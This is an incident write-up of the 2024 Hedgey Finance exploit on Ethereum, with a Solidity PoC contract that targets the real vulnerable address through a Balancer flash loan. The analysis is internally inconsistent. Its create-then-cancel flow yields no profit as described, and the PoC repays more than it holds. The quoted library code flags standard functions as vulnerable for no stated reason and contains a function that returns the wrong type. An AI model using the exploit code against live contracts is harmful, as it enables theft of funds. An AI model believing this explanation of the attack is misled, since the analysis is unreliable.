# Hedgey Finance — createLockedCampaign/cancelCampaign Instant Withdrawal Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Hedgey Finance |
| **Chain** | Ethereum |
| **Loss** | ~$48,000,000 |
| **Attacker** | [0xDed2b1a4](https://etherscan.io/address/0xDed2b1a426E1b7d415A40Bcad44e98F47181dda2) |
| **Attack Contract** | [0xC793113F](https://etherscan.io/address/0xC793113F1548B97E37c409f39244EE44241bF2b3) |
| **Vulnerable Contract** | [HedgeyFinance 0xBc452fdC](https://etherscan.io/address/0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511) |
| **Balancer Vault** | [0xBA122222](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **Root Cause** | `cancelCampaign()` returns deposited funds immediately to the original depositor without validating the lock period, enabling a create-cancel cycle within the same transaction to drain funds |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/HedgeyFinance_exp.sol) |

---

## 1. Vulnerability Overview

Hedgey Finance's `createLockedCampaign()` creates a campaign locked with deposited funds, and `cancelCampaign()` returns the funds to the campaign creator. By calling these two functions sequentially within the same TX (inside a flash loan), an attacker creates a campaign using flash-loaned funds and immediately cancels it to receive the funds back. When the flash loan amount equals the campaign deposit amount, profit is generated without any fees.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: campaign can be cancelled immediately after creation
interface IClaimCampaigns {
    function createLockedCampaign(
        bytes16 id,
        Campaign memory campaign,
        ClaimLockup memory claimLockup,
        TokenLockup calldata tokenLockup
    ) external;

    function cancelCampaign(bytes16 id) external;
}

// cancelCampaign(): returns the full remaining balance to the campaign creator
// Full refund on immediate cancellation after creation — no minimum holding period

// ✅ Safe code: enforce a minimum campaign duration
mapping(bytes16 => uint256) public campaignCreationBlock;

function cancelCampaign(bytes16 id) external {
    require(
        block.number >= campaignCreationBlock[id] + MIN_CAMPAIGN_DURATION,
        "campaign too new"
    );
    // ... cancellation logic
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: ClaimCampaigns.sol
  function cancelCampaign(bytes16 campaignId) external nonReentrant {  // ❌ Vulnerability
    Campaign memory campaign = campaigns[campaignId];
    require(campaign.manager == msg.sender, '!manager');
    delete campaigns[campaignId];
    delete claimLockups[campaignId];
    TransferHelper.withdrawTokens(campaign.token, msg.sender, campaign.amount);
    emit CampaignCancelled(campaignId);
  }
```

```solidity
// File: Address.sol
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     *
     * Furthermore, `isContract` will also return true if the target contract within
     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,
     * which only has an effect at the end of a transaction.
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {  // ❌ Vulnerability
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
```

```solidity
// File: MerkleProof.sol
library MerkleProof {
    /**
     * @dev Returns true if a `leaf` can be proved to be a part of a Merkle tree
     * defined by `root`. For this, a `proof` must be provided, containing
     * sibling hashes on the branch from the leaf to the root of the tree. Each
     * pair of leaves and each pair of pre-images are assumed to be sorted.
     */
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {  // ❌ Vulnerability
        return processProof(proof, leaf) == root;
    }

    /**
     * @dev Calldata version of {verify}
     *
     * _Available since v4.7._
     */
    function verifyCalldata(bytes32[] calldata proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        return processProofCalldata(proof, leaf);
    }

    /**
     * @dev Returns the rebuilt hash obtained by traversing a Merkle tree up
     * from `leaf` using `proof`. A `proof` is valid if and only if the rebuilt
     * hash matches the root of the tree. When processing the proof, the pairs
     * of leafs & pre-images are assumed to be sorted.
     *
     * _Available since v4.4._
     */
    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = _hashPair(computedHash, proof[i]);
        }
        return computedHash;
    }

    /**
     * @dev Calldata version of {processProof}
     *
     * _Available since v4.7._
     */
    function processProofCalldata(bytes32[] calldata proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = _hashPair(computedHash, proof[i]);
        }
        return computedHash;
    }

    /**
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash loan: 1,305,000 USDC
  │
  ├─→ [2] HedgeyFinance.approve(HedgeyFinance, 1,305,000 USDC)
  │
  ├─→ [3] createLockedCampaign(id, ..., 1,305,000 USDC)
  │         └─ Create campaign using flash-loaned USDC
  │
  ├─→ [4] cancelCampaign(id)
  │         └─ 1,305,000 USDC immediately returned to campaign creator (attacker)
  │
  ├─→ [5] Withdraw full USDC amount from HedgeyFinance
  │
  ├─→ [6] Repay Balancer flash loan (including fees)
  │
  └─→ [7] Repeat to drain ~$48M
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IClaimCampaigns {
    struct Campaign { /* ... */ }
    struct ClaimLockup { /* ... */ }
    struct TokenLockup { /* ... */ }

    function createLockedCampaign(bytes16 id, Campaign memory campaign, ClaimLockup memory claimLockup, TokenLockup calldata tokenLockup) external;
    function cancelCampaign(bytes16 id) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract AttackContract {
    IClaimCampaigns constant hedgey   = IClaimCampaigns(0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511);
    IBalancerVault  constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20          constant USDC     = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testExploit() external {
        address[] memory tokens  = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0]  = address(USDC);
        amounts[0] = 1_305_000e6;
        balancer.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory fees, bytes memory) external {
        // [1] Create campaign using flash-loaned USDC
        USDC.approve(address(hedgey), amounts[0]);
        bytes16 id = bytes16(keccak256(abi.encode(block.timestamp)));
        hedgey.createLockedCampaign(id, campaign, claimLockup, tokenLockup);

        // [2] Immediately cancel → full refund
        hedgey.cancelCampaign(id);

        // [3] Repay Balancer flash loan
        USDC.transfer(address(balancer), amounts[0] + fees[0]);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw (instant create/cancel) |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (flash loan + createLockedCampaign + cancelCampaign) |
| **DApp Category** | Token distribution / lock campaign platform |
| **Impact** | Full drainage of campaign funds (~$48M) |

## 6. Remediation Recommendations

1. **Minimum campaign duration**: Cancellation should only be allowed after N or more blocks have elapsed since creation
2. **Flash loan detection**: Detect and block create+cancel patterns within the same TX
3. **Cancellation fee**: Impose a fee on cancellation to eliminate flash loan profitability
4. **Mandatory minimum campaign period**: Enforce a minimum duration as a required parameter during campaign creation

## 7. Lessons Learned

- The "create then immediately cancel" pattern combined with flash loans is an attack vector that must be reviewed in all deposit/refund systems.
- The $48M loss could have been prevented by adding a delay of just 1 block between creation and cancellation.
- When implementing DeFi escrow functionality, a minimum holding period must be considered at the design stage.